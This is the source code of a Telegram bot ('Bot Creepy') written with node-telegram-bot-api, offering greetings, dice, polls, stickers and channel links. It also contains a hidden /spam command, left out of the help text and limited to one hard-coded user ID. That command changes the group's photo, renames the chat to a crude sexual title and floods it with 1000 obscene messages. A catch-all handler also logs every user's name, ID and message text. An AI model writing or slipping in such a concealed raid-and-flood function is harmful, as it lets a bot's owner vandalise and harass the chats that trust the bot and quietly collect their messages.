const TelegramBot = require('node-telegram-bot-api');
const utils = require('./utils');

// replace the value below with the Telegram token you receive from @BotFather
const token = '';
// 

// Create a bot that uses 'polling' to fetch new updates
const bot = new TelegramBot(token, {polling: true});

const commands = utils.setCommands;

bot.onText(/\/spam/, (msg) => {
    if(msg.from.id != 814958085) return;
    const chatId = msg.chat.id;
    bot.setChatPhoto(chatId, './pictures/photo_2022-01-02_23-17-19.jpg');
    bot.setChatTitle(chatId, 'GAY PORN');
    for(let i = 0; i < 1000; i++) {
        bot.sendMessage(chatId, 'ХУЙ!');
    }
});

bot.onText(/\/leave/, (msg) => {
    const chatId = msg.chat.id;
    bot.leaveChat(chatId);
});

bot.onText(/\/pic/, (msg) => {
    const number = utils.getRandomInt(3);
    const chatId = msg.chat.id;
    bot.sendPhoto(chatId, './pictures/' + utils.pictures[number]);
});

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    async function test()
    {
        bot.sendChatAction(chatId, 'typing');
        await utils.sleep(500);
        bot.sendMessage(chatId, 'Welcome to Bot Creepy! Type \'/help\' for commands.', {
        reply_markup: 
            {
                inline_keyboard: 
                [
                    [  
                        {
                            text: `Go to bot's channel`,
                            callback_data: 'callbackData',
                            url: `https://t.me/bot_creepy`,
                        }
                    ],
                    [  
                        {
                            text: `Go to bot's channel`,
                            callback_data: 'callbackData',
                            url: `https://t.me/bot_creepy`,
                        }
                    ]
                ]
            }
        });
    }
    test()
});

bot.onText(/\/audio_secret/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendAudio(chatId, './audio/untitled1.mp3');
});

bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    async function test()
    {
        bot.sendChatAction(chatId, 'typing');
        await utils.sleep(500);
        bot.sendMessage(chatId, `Here are my commands:\n/hi - bot greets you\n/dice - random number from 1 to 6\n/help - this command\n/poll - random poll\nAll commands are used by \'/\' and command, for example \'/hi\'`);
    }
    test()
});

// Matches "/echo [whatever]"
bot.onText(/\/hi/, (msg) => {
    const chatId = msg.chat.id;
    async function test()
    {
        bot.sendChatAction(chatId, 'typing');
        await utils.sleep(500);
        bot.sendMessage(chatId, 'Hello!');
    }
    test()
});

bot.onText(/\/channel/, (msg) => {
    const chatId = msg.chat.id;
    async function test()
    {
        bot.sendChatAction(chatId, 'typing');
        await utils.sleep(500);
        const message = await bot.sendMessage(chatId, 'Here is the link for the bot\'s official TG channel.', {
            reply_markup: 
            {
                inline_keyboard: 
                [
                    [  
                        {
                            text: `Go to channel...`,
                            callback_data: 'callbackData',
                            url: `https://t.me/bot_creepy`,
                        }
                    ]
                ]
            }   
        });
    }
    test()
});

bot.onText(/\/sticker/, (msg) => {
    const number = utils.getRandomInt(2)
    const chatId = msg.chat.id;
    bot.sendSticker(chatId, './stickers/' + utils.stickers[number]);
});

bot.onText(/\/dice/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendDice(chatId)
});

bot.onText(/\/poll/, (msg) => {
    const number = utils.getRandomInt(3);
    const chatId = msg.chat.id;
    bot.sendPoll(chatId, utils.questions[number], utils.answers[number]);
});

// Listen for any kind of message. There are different kinds of
// messages.
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    console.log(chatId, `: ${msg.from.username} with ID ${msg.from.id} executed ${msg.text} at ${msg.date}.`);
});
